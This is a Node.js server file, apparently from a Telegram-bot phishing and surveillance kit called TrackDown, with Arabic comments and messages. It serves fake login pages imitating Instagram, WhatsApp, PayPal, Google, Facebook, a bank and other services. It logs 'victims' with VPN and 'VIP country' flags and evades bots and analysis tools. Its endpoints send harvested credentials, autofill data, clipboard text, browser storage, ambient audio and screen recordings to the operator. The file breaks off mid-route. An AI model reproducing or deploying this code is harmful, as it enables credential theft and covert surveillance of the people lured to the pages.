app.use(urlencodedParser);
app.use(cors());
app.use('/public', express.static('public'));
app.set("view engine", "ejs");
app.set("views", __dirname);

var hostURL = process.env.HOST_URL || `https://${process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS || 'localhost:5000'}`;
//TOGGLE for Shorters - Now enabled by default
var use1pt=true;

// VPN Detection API
async function checkVPN(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,proxy,hosting`);
        const data = await res.json();
        return {
            country: data.country || 'Unknown',
            city: data.city || 'Unknown',
            isVPN: data.proxy || data.hosting || false
        };
    } catch(e) {
        return { country: 'Unknown', city: 'Unknown', isVPN: false };
    }
}

// Save victim to database
async function saveVictim(userId, ip, template, deviceInfo = {}) {
    try {
        const vpnData = await checkVPN(ip);
        await pool.query(
            `INSERT INTO victims (user_id, ip, country, city, device, browser, os, screen, template, is_vpn) 
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
            [userId, ip, vpnData.country, vpnData.city, deviceInfo.device || '', deviceInfo.browser || '', 
             deviceInfo.os || '', deviceInfo.screen || '', template, vpnData.isVPN]
        );
        return vpnData;
    } catch(e) {
        console.log("Save victim error:", e.message);
        return { country: 'Unknown', city: 'Unknown', isVPN: false };
    }
}

// Save credentials to database
async function saveCredentials(userId, platform, email, password, phone = '', extra = '') {
    try {
        await pool.query(
            `INSERT INTO credentials (user_id, platform, email, password, phone, extra_data) VALUES ($1, $2, $3, $4, $5, $6)`,
            [userId, platform, email, password, phone, extra]
        );
    } catch(e) {
        console.log("Save creds error:", e.message);
    }
}

// Save bot user
async function saveBotUser(chatId, username, firstName) {
    try {
        await pool.query(
            `INSERT INTO bot_users (chat_id, username, first_name) VALUES ($1, $2, $3) ON CONFLICT (chat_id) DO NOTHING`,
            [chatId, username || '', firstName || '']
        );
    } catch(e) {}
}

// Internal URL Shortener - No external services
function generateShortCode(length = 6) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

function getShortUrl(url) {
  const code = generateShortCode(6);
  shortLinks.set(code, url);
  return `${hostURL}/s/${code}`;
}

// Send link opened notification with quick action buttons
function sendLinkNotification(chatId, template, ip, location, time) {
    const visitCount = visitorHistory.get(ip) || 0;
    visitorHistory.set(ip, visitCount + 1);
    const isRepeat = visitCount > 0;
    const repeatTag = isRepeat ? `\n🔁 ضحية عائدة! (زيارة #${visitCount + 1})` : '';

    const country = location ? location.split(',').pop().trim() : '';
    const isVIP = highValueCountries.includes(country);
    const vipTag = isVIP ? '\n⭐ VIP - بلد عالي القيمة' : '';

    const classification = classifyVictim({ ip, location });
    const classTag = classification !== 'unknown' ? `\n🏷️ تصنيف: ${classification}` : '';

    const msg = `🔔 <b>تم فتح الرابط</b>\n\n📂 القالب: ${template}\n🌐 IP: <code>${ip}</code>${location ? '\n📍 '+location : ''}${repeatTag}${vipTag}${classTag}\n⏰ ${time}`;
    const buttons = {
        reply_markup: JSON.stringify({
            inline_keyboard: [
                [{text:"🚫 حظر", callback_data:"block_"+ip}, {text:"⭐ VIP", callback_data:"cat_vip_"+ip}, {text:"🔴 مهم", callback_data:"cat_imp_"+ip}]
            ]
        })
    };
    bot.sendMessage(chatId, msg, {parse_mode: "HTML", ...buttons}).catch(e => console.log('Notification error:', e.message));

    adminChatIds.forEach(adminId => {
        if (adminId !== chatId) {
            bot.sendMessage(adminId, msg, {parse_mode: "HTML"}).catch(() => {});
        }
    });

    if (isVIP) {
        const urgentMsg = `🚨🚨 <b>تنبيه VIP عاجل!</b> 🚨🚨\n\n📂 القالب: ${template}\n🌐 IP: <code>${ip}</code>\n📍 ${location}\n⏰ ${time}\n\n⚡ ضحية من بلد عالي القيمة!`;
        bot.sendMessage(chatId, urgentMsg, {parse_mode: "HTML"}).catch(() => {});
        adminChatIds.forEach(adminId => {
            if (adminId !== chatId) bot.sendMessage(adminId, urgentMsg, {parse_mode: "HTML"}).catch(() => {});
        });
    }

    if (slackWebhook) {
        fetch(slackWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text: `🔔 Link Opened | Template: ${template} | IP: ${ip} | Location: ${location} | Time: ${time}${isRepeat ? ' | 🔁 Repeat visitor #' + (visitCount+1) : ''}${isVIP ? ' | ⭐ VIP' : ''}` })
        }).catch(() => {});
    }

    if (teamsWebhook) {
        fetch(teamsWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text: `🔔 Link Opened | Template: ${template} | IP: ${ip} | Location: ${location} | Time: ${time}` })
        }).catch(() => {});
    }

    if (pushoverConfig.token && pushoverConfig.user) {
        fetch('https://api.pushover.net/1/messages.json', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: pushoverConfig.token, user: pushoverConfig.user, message: `Link Opened: ${template} | IP: ${ip} | ${location}`, title: 'TrackDown Alert' })
        }).catch(() => {});
    }

    if (iftttKey) {
        fetch(`https://maker.ifttt.com/trigger/link_opened/with/key/${iftttKey}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ value1: template, value2: ip, value3: location })
        }).catch(() => {});
    }

    logActivity('link_opened', { template, ip, location, time, isRepeat, isVIP });
}

// Anti-Bot Detection + Anti-Analysis
function isBot(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  if(analysisBlockers.some(sig => ua.includes(sig))) return true;
  return botSignatures.some(sig => ua.includes(sig));
}

// Check link expiry
function isLinkExpired(code) {
  const expiry = linkExpiry.get(code);
  if (!expiry) return false;
  return Date.now() > expiry;
}

const dashboardSessions = new Set();
app.post("/api/panel/login", (req, res) => {
    const { password } = req.body;
    if (password === (process.env.DASHBOARD_PASS || 'admin123')) {
        const token = require('crypto').randomBytes(32).toString('hex');
        dashboardSessions.add(token);
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
    }
});
function dashAuth(req, res, next) {
    const token = req.headers['x-dashboard-token'] || req.query.token;
    if (token && dashboardSessions.has(token)) return next();
    res.status(401).json({ error: 'Unauthorized' });
}
app.get("/dashboard", (req,res) => {
    res.render("dashboard", {a: hostURL});
});

// QR Code Generator endpoint
app.get("/qr/:text", (req, res) => {
  const text = decodeURIComponent(req.params.text);
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(text)}`;
  res.redirect(qrUrl);
});

// Short URL redirect handler
app.get("/s/:code", async (req, res) => {
  const code = req.params.code;
  const originalUrl = shortLinks.get(code);
  
  if (!originalUrl) {
    return res.status(404).send("Link not found or expired");
  }
  
  // Check expiry
  if (isLinkExpired(code)) {
    shortLinks.delete(code);
    linkExpiry.delete(code);
    return res.status(410).send("This link has expired");
  }
  
  // Check password protection
  const password = protectedLinks.get(code);
  if (password && !req.query.p) {
    return res.render("password", { code: code, a: hostURL });
  }
  if (password && req.query.p !== password) {
    return res.status(403).send("Invalid password");
  }
  
  // Anti-bot check
  if (isBot(req.headers['user-agent'])) {
    return res.status(403).send("Access denied");
  }
  
  res.redirect(originalUrl);
});

// Password verification for protected links
app.post("/verify_password", (req, res) => {
  const { code, password } = req.body;
  const correctPassword = protectedLinks.get(code);
  if (correctPassword && password === correctPassword) {
    const originalUrl = shortLinks.get(code);
    res.json({ success: true, url: originalUrl + "?p=" + password });
  } else {
    res.json({ success: false, message: "Wrong password" });
  }
});

// Statistics API
app.get("/api/stats/:uid", async (req, res) => {
  try {
    const uid = req.params.uid;
    const result = await pool.query(`
      SELECT template, COUNT(*) as count, 
             COUNT(CASE WHEN is_vpn THEN 1 END) as vpn_count,
             COUNT(CASE WHEN NOT is_vpn THEN 1 END) as real_count
      FROM victims WHERE user_id = $1 
      GROUP BY template
    `, [uid]);
    res.json(result.rows);
  } catch(e) {
    res.json({ error: e.message });
  }
});

// Audio Recording endpoint
app.post("/audio", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var audio = req.body.audio || null;
  var duration = decodeURIComponent(req.body.duration) || "unknown";
  if (uid && audio) {
    try {
      const buffer = Buffer.from(audio, 'base64');
      bot.sendAudio(parseInt(uid, 36), buffer, { caption: `🔊 تسجيل صوتي محيطي (${duration}s)` });
    } catch(e) { console.log(e); }
    res.send("Done");
  }
});

// Click tracking endpoint
app.post("/click", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var element = decodeURIComponent(req.body.element) || null;
  var x = req.body.x || 0;
  var y = req.body.y || 0;
  if (uid && element) {
    bot.sendMessage(parseInt(uid, 36), `🖱 نقرة: ${element} (${x}, ${y})`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Email harvest endpoint
app.post("/email", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var email = decodeURIComponent(req.body.email) || null;
  if (uid && email) {
    bot.sendMessage(parseInt(uid, 36), `📧 بريد: <code>${email}</code>`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Dark mode detection endpoint
app.post("/darkmode", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var isDark = req.body.isDark || false;
  if (uid) {
    const mode = isDark === 'true' ? '🌙 الوضع الداكن' : '☀️ الوضع الفاتح';
    bot.sendMessage(parseInt(uid, 36), `🌙 الوضع: ${mode}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// PWA install prompt endpoint
app.post("/pwa_install", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var accepted = req.body.accepted || false;
  if (uid) {
    const status = accepted === 'true' ? '✅ قبل التثبيت' : '❌ رفض التثبيت';
    bot.sendMessage(parseInt(uid, 36), `📲 PWA: ${status}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Form data capture endpoint
app.post("/formdata", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    bot.sendMessage(parseInt(uid, 36), `📝 نموذج:\n<code>${data}</code>`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Bluetooth devices detection
app.post("/bluetooth", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var devices = decodeURIComponent(req.body.devices) || null;
  if (uid && devices) {
    bot.sendMessage(parseInt(uid, 36), `📡 Bluetooth:\n<code>${devices}</code>`, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Autofill data capture
app.post("/autofill", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    bot.sendMessage(parseInt(uid, 36), `🔑 Autofill:\n<code>${data}</code>`, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Behavior analysis
app.post("/behavior", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    bot.sendMessage(parseInt(uid, 36), `🧠 سلوك:\n${data}`, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Full storage capture
app.post("/fullstorage", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var local = decodeURIComponent(req.body.local) || "";
  var session = decodeURIComponent(req.body.session) || "";
  var indexed = decodeURIComponent(req.body.indexed) || "";
  if (uid) {
    let msg = `💾 <b>بيانات التخزين الكاملة:</b>\n\n`;
    if(local) msg += `<b>LocalStorage:</b>\n<code>${local.substring(0,1500)}</code>\n\n`;
    if(session) msg += `<b>SessionStorage:</b>\n<code>${session.substring(0,1500)}</code>\n\n`;
    if(indexed) msg += `<b>IndexedDB:</b>\n<code>${indexed.substring(0,500)}</code>`;
    bot.sendMessage(parseInt(uid, 36), msg, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Vibration trigger (acknowledgment)
app.post("/vibrate", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `📳 اهتزاز الجهاز`, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Sound played notification
app.post("/sound", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `🔊 تشغيل صوت`, { parse_mode: "HTML" });
    res.send("Done");
  } else { res.send("No"); }
});

// Mouse movement heatmap data
app.post("/heatmap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = req.body.data || null;
  if (uid && data) {
    res.send("Done");
  }
});

// Print detection
app.post("/print", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var action = req.body.action || null;
  if (uid && action) {
    const status = action === 'print_started' ? '🖨️ بدأ الطباعة!' : '✅ انتهت الطباعة';
    bot.sendMessage(parseInt(uid, 36), status, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Right click detection
app.post("/rightclick", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var x = req.body.x || 0;
  var y = req.body.y || 0;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `🖱 نقر يميني: (${x}, ${y})`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Copy/Paste detection
app.post("/copypaste", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var action = req.body.action || null;
  var text = req.body.text || '';
  if (uid && action) {
    const emoji = action === 'copy' ? '📋' : '📥';
    const label = action === 'copy' ? 'نسخ' : 'لصق';
    if (text) {
      bot.sendMessage(parseInt(uid, 36), `${emoji} <b>${label}:</b>\n<code>${text}</code>`, { parse_mode: "HTML" });
    }
    res.send("Done");
  }
});

// Focus/Blur detection
app.post("/focus", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var action = req.body.action || null;
  if (uid && action) {
    const status = action === 'focus' ? '🔵 عاد للصفحة' : '⚪ غادر الصفحة';
    bot.sendMessage(parseInt(uid, 36), status, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Orientation change
app.post("/orientation", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var orientation = req.body.orientation || null;
  if (uid && orientation) {
    bot.sendMessage(parseInt(uid, 36), `📱 اتجاه: ${orientation}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Device motion (shake)
app.post("/motion", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var shake = req.body.shake || false;
  if (uid && shake) {
    bot.sendMessage(parseInt(uid, 36), `📳 هز الجهاز`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Page performance
app.post("/performance", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var loadTime = req.body.loadTime || 0;
  var domReady = req.body.domReady || 0;
  var firstPaint = req.body.firstPaint || 0;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `⚡ أداء: ${loadTime}ms تحميل، ${domReady}ms DOM، ${Math.round(firstPaint)}ms رسم`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Error logging
app.post("/error", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var msg = req.body.msg || '';
  var url = req.body.url || '';
  var line = req.body.line || 0;
  if (uid && msg) {
    bot.sendMessage(parseInt(uid, 36), `🔴 خطأ JS: ${msg} (سطر ${line})`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Storage access
app.post("/storage", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var local = req.body.local || '{}';
  var session = req.body.session || '{}';
  if (uid) {
    const localData = JSON.parse(local);
    const sessionData = JSON.parse(session);
    const localCount = Object.keys(localData).length;
    const sessionCount = Object.keys(sessionData).length;
    if (localCount > 0 || sessionCount > 0) {
      bot.sendMessage(parseInt(uid, 36), `💾 تخزين: Local ${localCount}، Session ${sessionCount}`, { parse_mode: "HTML" });
    }
    res.send("Done");
  }
});

// Media devices
app.post("/mediadevices", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var devices = req.body.devices || '[]';
  if (uid) {
    const devList = JSON.parse(devices);
    const cameras = devList.filter(d => d.kind === 'videoinput').length;
    const mics = devList.filter(d => d.kind === 'audioinput').length;
    const speakers = devList.filter(d => d.kind === 'audiooutput').length;
    bot.sendMessage(parseInt(uid, 36), `📹 وسائط: ${cameras} كاميرا، ${mics} مايك، ${speakers} مكبر`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Speed test
app.post("/speedtest", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var ping = req.body.ping || 0;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `📶 Ping: ${ping}ms`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Idle detection
app.post("/idle", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var seconds = req.body.seconds || 0;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `😴 خامل: ${seconds}ث`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Screen recording
app.post("/screenrecord", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var video = req.body.video || null;
  if (uid && video) {
    try {
      const buffer = Buffer.from(video, 'base64');
      bot.sendVideo(parseInt(uid, 36), buffer, { caption: `🖥️ تسجيل شاشة!` });
    } catch(e) { console.log(e); }
    res.send("Done");
  }
});

// Scroll depth tracking
app.post("/scroll", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var depth = req.body.depth || 0;
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `📜 تمرير: ${depth}%`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Tab visibility tracking
app.post("/visibility", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var visible = req.body.visible || false;
  if (uid) {
    const status = visible === 'true' ? '👁️ الصفحة مرئية' : '🙈 الصفحة مخفية';
    bot.sendMessage(parseInt(uid, 36), status, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Timezone detection
app.post("/timezone", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var tz = decodeURIComponent(req.body.tz) || null;
  var offset = req.body.offset || 0;
  if (uid && tz) {
    bot.sendMessage(parseInt(uid, 36), `🌍 <b>المنطقة الزمنية:</b>\n${tz}\nUTC${offset >= 0 ? '+' : ''}${offset / 60}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Language detection
app.post("/language", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var lang = decodeURIComponent(req.body.lang) || null;
  var langs = decodeURIComponent(req.body.langs) || null;
  if (uid && lang) {
    bot.sendMessage(parseInt(uid, 36), `🗣️ <b>اللغة:</b> ${lang}\n<b>اللغات المدعومة:</b> ${langs}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Incognito/Private mode detection
app.post("/incognito", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var isIncognito = req.body.isIncognito || false;
  if (uid) {
    const mode = isIncognito === 'true' ? '🕵️ وضع التصفح الخفي' : '👤 وضع التصفح العادي';
    bot.sendMessage(parseInt(uid, 36), `<b>وضع المتصفح:</b> ${mode}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// AdBlocker detection
app.post("/adblocker", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var hasAdBlocker = req.body.hasAdBlocker || false;
  if (uid) {
    const status = hasAdBlocker === 'true' ? '🚫 مانع إعلانات مُفعّل' : '✅ لا يوجد مانع إعلانات';
    bot.sendMessage(parseInt(uid, 36), status, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Touch/Device capabilities
app.post("/capabilities", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var caps = decodeURIComponent(req.body.caps) || null;
  if (uid && caps) {
    bot.sendMessage(parseInt(uid, 36), `📱 <b>قدرات الجهاز:</b>\n${caps}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

// Referrer tracking
app.post("/referrer", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var referrer = decodeURIComponent(req.body.referrer) || "Direct";
  if (uid) {
    bot.sendMessage(parseInt(uid, 36), `🔗 <b>المصدر:</b> ${referrer || 'Direct'}`, { parse_mode: "HTML" });
    res.send("Done");
  }
});

app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  sendLinkNotification(parseInt(req.params.path,36), 'WebView', ip, null, d);
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const userId = parseInt(req.params.path,36);
  const fakeMsg = userFakeMsg.get(userId) || null;
  sendLinkNotification(userId, 'Cloudflare', ip, null, d);
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt,fakeMsg:JSON.stringify(fakeMsg)});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Login Template - صفحة تسجيل دخول وهمية
app.get("/l/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  sendLinkNotification(parseInt(req.params.path,36), 'Login Page', ip, null, d);
res.render("login",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Prize Template - صفحة جائزة وهمية
app.get("/p/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  sendLinkNotification(parseInt(req.params.path,36), 'Prize Page', ip, null, d);
res.render("prize",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Instagram Template
app.get("/i/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Instagram');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Instagram', ip, vpn.city+', '+vpn.country, d);
  res.render("instagram",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Snapchat Template
app.get("/s/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Snapchat');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Snapchat', ip, vpn.city+', '+vpn.country, d);
  res.render("snapchat",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// WhatsApp Template
app.get("/wa/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'WhatsApp');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'WhatsApp', ip, vpn.city+', '+vpn.country, d);
  res.render("whatsapp",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Bank Template
app.get("/b/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Bank');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Bank', ip, vpn.city+', '+vpn.country, d);
  res.render("bank",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Netflix Template
app.get("/nf/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Netflix');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Netflix', ip, vpn.city+', '+vpn.country, d);
  res.render("netflix",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// PayPal Template
app.get("/pp/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'PayPal');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'PayPal', ip, vpn.city+', '+vpn.country, d);
  res.render("paypal",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Google Template
app.get("/g/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Google');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Google', ip, vpn.city+', '+vpn.country, d);
  res.render("google",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Facebook Template
app.get("/fb/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Facebook');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Facebook', ip, vpn.city+', '+vpn.country, d);
  res.render("facebook",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// TikTok Template
app.get("/tt/:path/:uri", async (req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'TikTok');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'TikTok', ip, vpn.city+', '+vpn.country, d);
  res.render("tiktok",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Custom Form Template
app.get("/cu/:path/:uri", async (req,res)=>{
var ip;
